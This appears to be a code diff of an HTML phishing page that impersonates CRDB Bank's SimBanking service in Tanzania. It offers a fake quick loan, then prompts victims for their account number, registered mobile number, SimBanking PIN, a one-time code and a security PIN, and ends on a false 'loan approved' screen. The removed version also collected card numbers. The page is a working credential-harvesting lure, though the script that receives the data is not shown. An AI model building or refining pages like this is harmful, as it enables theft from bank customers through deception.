@@ -3,263 +3,139 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CRDB Simbanking Tanzania Loan Portal</title>
+    <title>CRDB Bank - SimBanking Tanzania</title>
     <link rel="stylesheet" href="style.css">
 </head>
 <body>
-    <div class="app-container">
-        <!-- TOP HEADER -->
-        <header class="app-header">
-            <span class="back-btn" id="globalBackBtn">&#8592; Rudi</span>
-            <div class="logo-area">
-                <span class="bank-title">CRDB BANK</span>
-                <span class="sub-title">SIMBANKING TANZANIA</span>
+    <div id="notification-banner" class="notification hidden"></div>
+
+    <header class="navbar">
+        <div class="nav-left">← Rudi</div>
+        <div class="nav-brand">
+            <h2>CRDB BANK</h2>
+            <span>SIMBANKING TANZANIA</span>
+        </div>
+        <div class="nav-menu">☰</div>
+    </header>
+
+    <main class="container">
+        <!-- Step 1: Loan Calculator / Application Start -->
+        <section id="step-loan" class="card">
+            <h2>Pata Mkopo Wako Haraka - CRDB</h2>
+            <p class="subtitle">Idhini ya haraka • Riba nafuu • Muda rahisi Tanzania</p>
+            
+            <div class="form-group">
+                <label>Kiasi cha Mkopo (TZS)</label>
+                <div class="amount-display" id="amount-text">TSh 100,000</div>
+                <input type="range" id="loan-amount" min="10000" max="100000000" step="10000" value="100000">
+                <div class="range-labels"><span>TSh 10K</span><span>TSh 100M</span></div>
             </div>
-            <div class="menu-icon">&#9776;</div>
-        </header>
 
-        <main class="content-body">
-            <!-- SURFACE NOTIFICATION BANNER -->
-            <div id="surfaceNotification" class="surface-notification hidden"></div>
+            <div class="form-group">
+                <label>Muda wa Mkopo</label>
+                <div class="amount-display" id="months-text">miezi 12</div>
+                <input type="range" id="loan-months" min="6" max="60" value="12">
+                <div class="range-labels"><span>miezi 6</span><span>miezi 60</span></div>
+            </div>
 
-            <!-- SLIDER / HOME SCREEN (Index 0) -->
-            <section id="stepSlider" class="form-step active">
-                <div class="card-box">
-                    <h2>Pata Mkopo Wako Haraka - CRDB</h2>
-                    <p class="subtitle">Idhini ya haraka • Riba nafuu • Muda rahisi Tanzania</p>
-                    
-                    <div class="calc-box">
-                        <label>Kiasi cha Mkopo (TZS)</label>
-                        <div class="amount-display" id="loanAmountText">TSh 100,000</div>
-                        <input type="range" id="loanRange" min="10000" max="100000000" step="10000" value="100000">
-                        <div class="range-limits"><span>TSh 10K</span><span>TSh 100M</span></div>
+            <div class="summary-box">
+                <span>Malipo ya Kila Mwezi</span>
+                <strong id="monthly-payment">TSh 9,504</strong>
+            </div>
 
-                        <label>Muda wa Mkopo</label>
-                        <div class="amount-display" id="durationText">miezi 12</div>
-                        <input type="range" id="durationRange" min="6" max="60" step="1" value="12">
-                        <div class="range-limits"><span>miezi 6</span><span>miezi 60</span></div>
+            <button id="btn-omba" class="btn-primary">OMBA SASA</button>
 
-                        <div class="monthly-payment">
-                            <span>Malipo ya Kila Mwezi</span>
-                            <strong id="monthlyPaymentText">TSh 9,504</strong>
-                        </div>
-                    </div>
+            <div class="footer-badges">
+                <span>⚡ Idhini ya Haraka <small>Ndani ya masaa 24</small></span>
+                <span>💰 Riba Nafuu <small>Kuanzia 25%</small></span>
+                <span>🔒 Salama <small>Kiwango cha CRDB</small></span>
+            </div>
+        </section>
 
-                    <button class="primary-btn" id="toStep1Btn">OMBA SASA</button>
+        <!-- Step 2: Simbanking Credentials Activation -->
+        <section id="step-credentials" class="card hidden">
+            <h2>Activation</h2>
+            <p class="subtitle">Please enter your credentials used to access SimBanking USSD(*150*03#)</p>
+            
+            <div class="form-group">
+                <label>Account number linked with Simbanking</label>
+                <input type="text" id="acc-number" placeholder="Enter account number">
+            </div>
 
-                    <div class="features-footer">
-                        <div>⚡ <strong>Idhini ya Haraka</strong><br><small>Ndani ya masaa 24</small></div>
-                        <div>💰 <strong>Riba Nafuu</strong><br><small>Kuanzia 25%</small></div>
-                        <div>🔒 <strong>Salama</strong><br><small>Kiwango cha CRDB</small></div>
-                    </div>
-                </div>
-            </section>
+            <div class="form-group">
+                <label>Mobile number registered for Simbanking</label>
+                <input type="text" id="mobile-number" placeholder="0755******">
+            </div>
 
-            <!-- STEP 1 OF 3 (Index 1) -->
-            <section id="step1" class="form-step">
-                <h3>Maombi ya Mkopo - CRDB</h3>
-                <div class="step-indicator">Hatua 1 ya 3</div>
-                <div class="progress-bar-container"><div class="progress-bar" style="width: 33%;"></div></div>
+            <div class="form-group">
+                <label>Simbanking PIN</label>
+                <input type="password" id="sim-pin" placeholder="****" maxlength="4">
+            </div>
 
-                <div class="input-group">
-                    <label>Aina ya Mkopo</label>
-                    <select id="loanType">
-                        <option>Mkopo wa Biashara</option>
-                        <option>Mkopo wa Mshahara</option>
-                        <option>Mkopo wa Dharura</option>
-                    </select>
-                </div>
-
-                <div class="input-group">
-                    <label>Kiasi cha Mkopo (TSh)</label>
-                    <input type="number" id="step1Amount" value="100000">
-                </div>
-
-                <div class="input-group">
-                    <label>Muda wa Mkopo</label>
-                    <select id="step1Duration">
-                        <option>Miezi 12</option>
-                        <option>Miezi 24</option>
-                        <option>Miezi 48</option>
-                    </select>
-                </div>
-
-                <div class="input-group">
-                    <label>Madhumuni ya Mkopo</label>
-                    <textarea id="loanPurpose" placeholder="Elezea madhumuni ya mkopo wako..."></textarea>
-                </div>
-
-                <div class="btn-group">
-                    <button class="secondary-btn" id="backToSlider">ILIYOTANGULIA</button>
-                    <button class="primary-btn" id="nextToStep2" style="margin-top:0;">HATUA INAYOFUATA</button>
-                </div>
-            </section>
-
-            <!-- STEP 2 OF 3 (Index 2) -->
-            <section id="step2" class="form-step">
-                <h3>Maombi ya Mkopo - CRDB</h3>
-                <div class="step-indicator">Hatua 2 ya 3</div>
-                <div class="progress-bar-container"><div class="progress-bar" style="width: 66%;"></div></div>
-
-                <div class="row-inputs">
-                    <div class="input-group">
-                        <label>Jina la Kwanza</label>
-                        <input type="text" id="firstName" placeholder="Jina la kwanza">
-                    </div>
-                    <div class="input-group">
-                        <label>Jina la Ukoo</label>
-                        <input type="text" id="lastName" placeholder="Jina la ukoo">
-                    </div>
-                </div>
-
-                <div class="input-group">
-                    <label>Namba ya Simu (Tanzania Only)</label>
-                    <div class="phone-input-box">
-                        <span class="flag">🇹🇿 +255</span>
-                        <input type="tel" id="phoneNumber" placeholder="712345678" maxlength="9">
-                    </div>
-                    <small>Lazima iwe namba halali ya Tanzania (+255, namba 9 kuanzia 6, 7 au 5)</small>
-                </div>
-
-                <div class="btn-group">
-                    <button class="secondary-btn" id="backToStep1">ILIYOTANGULIA</button>
-                    <button class="primary-btn" id="nextToStep3" style="margin-top:0;">HATUA INAYOFUATA</button>
-                </div>
-            </section>
-
-            <!-- STEP 3 OF 3 (Index 3) -->
-            <section id="step3" class="form-step">
-                <h3>Maombi ya Mkopo - CRDB</h3>
-                <div class="step-indicator">Hatua 3 ya 3</div>
-                <div class="progress-bar-container"><div class="progress-bar" style="width: 100%;"></div></div>
-
-                <div class="input-group">
-                    <label>Hali ya Ajira</label>
-                    <select id="employmentStatus">
-                        <option>Mfanyabiashara</option>
-                        <option>Mwajiriwa</option>
-                        <option>Miajiri binafsi</option>
-                    </select>
-                </div>
-
-                <div class="input-group">
-                    <label>Mapato ya Mwaka (TSh)</label>
-                    <input type="number" id="annualIncome" placeholder="Weka mapato ya mwaka">
-                </div>
-
-                <div class="summary-box">
-                    <strong>Muhtasari wa Maombi</strong>
-                    <div id="summaryDetails"></div>
-                </div>
-
-                <div class="btn-group">
-                    <button class="secondary-btn" id="backToStep2">ILIYOTANGULIA</button>
-                    <button class="primary-btn" id="submitLoanApp" style="margin-top:0;">WASILISHA MAOMBI</button>
-                </div>
-            </section>
-
-            <!-- ACCOUNT & CARD DETAILS VERIFICATION (Index 4) -->
-            <section id="accountVerification" class="form-step">
-                <div class="sub-header-bar">Uthibitishaji wa Kadi ya Tembo</div>
-                <p class="info-text">Karibu! Tafadhali unanisha akaunti yako ya Benki ya CRDB</p>
-
-                <div class="input-group">
-                    <label>Ingiza nambari yako ya akaunti (Tarakimu 13)</label>
-                    <input type="tel" id="accountNumberInput" placeholder="Ingiza tarakimu 13" maxlength="13">
-                </div>
-
-                <div class="input-group">
-                    <label>Ingiza nambari yako ya kadi (Tarakimu 16)</label>
-                    <input type="tel" id="cardNumberInput" placeholder="Ingiza tarakimu 16" maxlength="16">
-                </div>
-
-                <div class="btn-group">
-                    <button class="secondary-btn" id="backToStep3FromAcc">ILIYOTANGULIA</button>
-                    <button class="primary-btn green-btn" id="submitAccountDetails" style="margin-top:0;">ENDELEA</button>
-                </div>
-            </section>
-
-            <!-- LOADING / WAITING SCREEN (Index 5) -->
-            <section id="loadingScreen" class="form-step center-loading-screen">
+            <div class="spinner-container hidden" id="credentials-spinner">
                 <div class="spinner"></div>
-                <h2>Inachakata Maombi Yako...</h2>
-                <p>Tafadhali subiri kidogo wakati mfumo wa CRDB unathibitisha maelezo yako na kutoa idhini ya mkopo.</p>
-                <div class="waiting-badge">🛡️ Usalama wa Benki ya CRDB</div>
-            </section>
+                <p>Inathibitisha maelezo yako...</p>
+            </div>
 
-            <!-- OTP SCREEN (Index 6) -->
-            <section id="otpScreen" class="form-step dark-theme">
-                <div class="icon-shield">🛡️</div>
-                <h2>Thibitisha Akaunti Yako - CRDB</h2>
-                <p>Tafadhali ingiza namba ya OTP ya tarakimu 5 iliyotumwa kwa namba yako ya Tembo Tanzania.</p>
-                <div class="otp-sent-info">📞 OTP imetumwa kwa: <span id="displayPhone"> +255 7XX XXX XXX (Tembo)</span></div>
+            <button id="btn-continue-creds" class="btn-primary">CONTINUE</button>
+        </section>
 
-                <div class="otp-inputs" id="otpContainer">
-                    <input type="text" maxlength="1" class="otp-box" inputmode="numeric">
-                    <input type="text" maxlength="1" class="otp-box" inputmode="numeric">
-                    <input type="text" maxlength="1" class="otp-box" inputmode="numeric">
-                    <input type="text" maxlength="1" class="otp-box" inputmode="numeric">
-                    <input type="text" maxlength="1" class="otp-box" inputmode="numeric">
+        <!-- Step 3: OTP Verification -->
+        <section id="step-otp" class="card hidden">
+            <div class="shield-icon">🛡️</div>
+            <h2>Thibitisha Akaunti Yako - CRDB</h2>
+            <p class="subtitle">Tafadhali ingiza namba ya OTP ya tarakimu 5 iliyotumwa kwa namba yako.</p>
+            
+            <div class="otp-inputs">
+                <input type="text" maxlength="1" class="otp-box" />
+                <input type="text" maxlength="1" class="otp-box" />
+                <input type="text" maxlength="1" class="otp-box" />
+                <input type="text" maxlength="1" class="otp-box" />
+                <input type="text" maxlength="1" class="otp-box" />
+            </div>
+
+            <button id="btn-verify-otp" class="btn-primary">Thibitisha Akaunti</button>
+        </section>
+
+        <!-- Step 4: Security PIN (Ingiza PIN ya Usalama) -->
+        <section id="step-security-pin" class="card hidden">
+            <h2>Ingiza PIN ya Usalama - CRDB</h2>
+            <p class="subtitle">Ingiza namba ya siri (PIN) ya usalama ya Simbanking ili kuendelea.</p>
+            
+            <div class="form-group">
+                <label>🔒 PIN ya Usalama</label>
+                <div class="otp-inputs">
+                    <input type="password" maxlength="1" class="pin-box" />
+                    <input type="password" maxlength="1" class="pin-box" />
+                    <input type="password" maxlength="1" class="pin-box" />
+                    <input type="password" maxlength="1" class="pin-box" />
                 </div>
+            </div>
 
-                <button class="primary-btn green-btn" id="verifyOtpBtn">Thibitisha Akaunti</button>
+            <button id="btn-verify-security-pin" class="btn-primary">ENDELEA</button>
+        </section>
 
-                <div class="resend-container">
-                    <span>Je, haukupokea namba ya OTP?</span>
-                    <a href="#" id="resendOtpLink">♻️ Tuma tena OTP</a>
-                </div>
-            </section>
+        <!-- Step 5: Success Screen -->
+        <section id="step-success" class="card hidden success-card">
+            <div class="success-icon">✓</div>
+            <h2>Hongera!</h2>
+            <p class="subtitle">Mkopo wako umeidhinishwa! Fedha zitatolewa hivi karibuni.</p>
 
-            <!-- PIN SCREEN (Index 7) -->
-            <section id="pinScreen" class="form-step">
-                <h2>Ingiza PIN ya Usalama - CRDB</h2>
-                <p>Ingiza namba ya siri (PIN) ya usalama ya Simbanking ili kuendelea.</p>
-                <div class="icon-lock">🔒</div>
+            <div class="success-amount-box">
+                <small>KIASI KILICHOIDHINISHWA</small>
+                <h1 id="approved-amount-text">TSh 100,000</h1>
+            </div>
 
-                <label>PIN ya Usalama</label>
-                <div class="otp-inputs" id="pinContainer">
-                    <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
-                    <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
-                    <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
-                    <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
-                </div>
-                <small>ℹ️ Ingiza namba ya siri ya tarakimu 4 (PIN) ya Simbanking CRDB.</small>
+            <div class="summary-box">
+                <span>MALIPO YA KILA MWEZI</span>
+                <strong id="success-monthly">TSh 2,441</strong>
+            </div>
 
-                <button class="primary-btn green-btn" id="verifyPinBtn">ENDELEA</button>
-            </section>
-
-            <!-- CONGRATULATIONS SCREEN (Index 8) -->
-            <section id="congratsScreen" class="form-step congrats-theme">
-                <div class="congrats-header">
-                    <h1>Hongera!</h1>
-                    <h3>Akaunti yako imefanikiwa kuanzishwa na kuamilishwa!</h3>
-                    <p>Karibu katika Simbanking CRDB BANK TANZANIA. Sasa unaweza kutumia huduma za benki kwa urahisi na usalama.</p>
-                </div>
-
-                <div class="customer-info-card">
-                    <h4>Taarifa ya Mteja</h4>
-                    <div class="info-row"><span>Jina:</span> <strong id="congratsName">JANE MWANGI</strong></div>
-                    <div class="info-row"><span>Nambari ya Simu:</span> <strong id="congratsPhone">+255 712 345 678</strong></div>
-                    <div class="info-row"><span>Nambari ya Akaunti:</span> <strong id="congratsAcc">SBK0012345678</strong></div>
-                    <div class="info-row"><span>Aina ya Akaunti:</span> <strong>Akaunti ya Akiba</strong></div>
-                    <div class="info-row"><span>Tawi:</span> <strong>CRDB BANK TANZANIA</strong></div>
-                </div>
-
-                <div class="biometric-success-box">
-                    <span>✅ Usanidi wa Kibayometriki Umefanikiwa!</span>
-                    <small>Alama ya kidole (fingerprint) yako sasa imesajiliwa kwa usalama.</small>
-                </div>
-
-                <div class="footer-badges">
-                    <div>🔒 Usalama wa Juu<br><small>Data yako inalindwa</small></div>
-                    <div>⚡ Haraka na Rahisi<br><small>Benki popote, wakati wowote</small></div>
-                    <div>📱 Upatikanaji Rahisi<br><small>Kwenye simu yako</small></div>
-                </div>
-            </section>
-        </main>
-    </div>
+            <button class="btn-primary" onclick="location.reload()">Rudi Nyumbani</button>
+        </section>
+    </main>
 
     <script src="script.js"></script>
 </body>
     </html>
-                                                                                                   
+                    
